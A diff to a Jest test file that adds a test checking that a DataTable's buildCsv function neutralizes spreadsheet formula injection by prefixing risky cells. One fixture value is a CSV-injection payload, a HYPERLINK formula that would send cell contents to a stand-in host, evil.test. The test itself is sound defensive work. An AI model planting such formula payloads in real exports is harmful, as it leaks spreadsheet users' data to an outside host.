@@ -205,6 +205,23 @@ describe('DataTable', () => {
     expect(csv).toBe('Name,Qty\nAlpha,10\n"Bravo, Inc",20');
   });
 
+  it('buildCsv neutralizes spreadsheet formula triggers in tenant-supplied cells', () => {
+    const cols: Array<DataTableColumn<Row>> = [
+      { key: 'name', header: 'Name', accessor: (r) => r.name },
+      { key: 'qty', header: 'Qty', csv: (r) => r.qty },
+    ];
+    const csv = buildCsv(cols, [
+      { id: 1, name: '=HYPERLINK("http://evil.test/?d="&A1,"CLICK")', qty: 10 },
+      { id: 2, name: '@rev A', qty: -5 },
+    ]);
+    expect(csv).toBe(
+      'Name,Qty\n' +
+        '"\'=HYPERLINK(""http://evil.test/?d=""&A1,""CLICK"")",10\n' +
+        // -5 is a plain number: left numeric, not prefixed.
+        "'@rev A,-5"
+    );
+  });
+
   it('CSV export builds a blob and triggers a download click', () => {
     const createSpy = jest
       .spyOn(URL, 'createObjectURL')
